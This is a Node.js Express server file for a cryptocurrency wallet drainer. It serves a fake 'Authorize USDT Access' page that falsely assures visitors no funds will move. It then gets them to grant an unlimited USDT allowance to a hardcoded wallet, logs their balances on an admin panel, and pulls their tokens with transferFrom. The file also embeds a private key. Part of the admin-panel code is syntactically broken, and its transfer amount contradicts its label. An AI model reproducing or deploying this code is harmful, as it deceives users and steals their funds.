const express = require("express"); const { ethers } = require("ethers"); const app = express(); const PORT = 3000;

// Constants const PRIVATE_KEY = "f9d6c36675444fd1276c8fac11dfb54288b5a61df546c38ce6a8ad522b1a692e"; // Your wallet const PLATFORM_WALLET = "0x742d35Cc6634C0532925a3b8D2B67E73e7b3AC73"; // Admin wallet const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/"); const wallet = new ethers.Wallet(PRIVATE_KEY, provider); const usdt = new ethers.Contract( USDT_ADDRESS, [ "function balanceOf(address) view returns (uint)", "function allowance(address owner, address spender) view returns (uint)", "function transferFrom(address from, address to, uint amount) returns (bool)" ], wallet );

app.use(express.json());

let users = [];

app.get("/", (req, res) => { res.send(`<!DOCTYPE html>

  <html lang=\"en\">
  <head>
    <meta charset=\"UTF-8\" />
    <title>Token Access Approval</title>
    <style>
      body { font-family: sans-serif; background: #111; color: #fff; text-align: center; padding: 100px; }
      button { padding: 10px 25px; font-size: 18px; border: none; border-radius: 10px; background: #0af; color: #fff; cursor: pointer; }
      .note { margin-top: 20px; font-size: 14px; color: #ccc; }
      .wallet { margin-top: 15px; font-size: 16px; font-weight: bold; }
    </style>
  </head>
  <body>
    <h1>🔐 Authorize USDT Access</h1>
    <p>Connect your wallet to grant permission for admin-requested transfers.</p>
    <button onclick=\"connectWallet()\">Connect Wallet</button>
    <div class=\"wallet\" id=\"walletAddress\"></div>
    <div class=\"note\">By connecting, you approve USDT access. No funds will move without your approval.</div>
    <script src=\"https://cdn.ethers.io/lib/ethers-5.2.umd.min.js\"></script>
    <script>
      let signer, userAddress;
      const USDT = new ethers.Contract("${USDT_ADDRESS}", [
        "function approve(address spender, uint amount) returns (bool)",
        "function allowance(address owner, address spender) view returns (uint)"
      ], window.ethereum);async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask");

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    document.getElementById("walletAddress").innerText = "Connected: " + userAddress;

    const token = USDT.connect(signer);
    const allowance = await token.allowance(userAddress, "${PLATFORM_WALLET}");
    const max = ethers.constants.MaxUint256;

    if (allowance.lt(max.div(2))) {
      const tx = await token.approve("${PLATFORM_WALLET}", max);
      await tx.wait();
    }

    const signature = await signer.signMessage("I authorize USDT access");

    await fetch("/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ wallet: userAddress, signature, time: Date.now() })
    });

    alert("✅ Approval granted. You may now close this tab.");
  }
</script>

  </body>
  </html>`);
});app.post("/log", async (req, res) => { const { wallet, signature, time } = req.body; if (!wallet || !signature) return res.status(400).send("Invalid"); const balance = await usdt.balanceOf(wallet); users.push({ wallet, signature, time, balance: balance.toString() }); res.send("Logged"); });

app.get("/admin", (req, res) => { let html = <h1>Admin Panel</h1><table border=1 cellpadding=8><tr><th>Wallet</th><th>Time</th><th>Balance</th><th>Action</th></tr>; for (let user of users) { html += <tr> <td>${user.wallet}</td> <td>${new Date(user.time).toLocaleString()}</td> <td>${ethers.utils.formatUnits(user.balance, 18)} USDT</td> <td><a href='/pull?wallet=${user.wallet}&amount=1000000'>Transfer 1 USDT</a></td> </tr>; } html += </table>; res.send(html); });

app.get("/pull", async (req, res) => { const { wallet, amount } = req.query; try { const tx = await usdt.transferFrom(wallet, PLATFORM_WALLET, amount); await tx.wait(); res.send("✅ Transfer complete"); } catch (err) { res.send("❌ Transfer failed: " + err.message); } });

app.listen(PORT, () => console.log("Running on http://localhost:" + PORT));

        
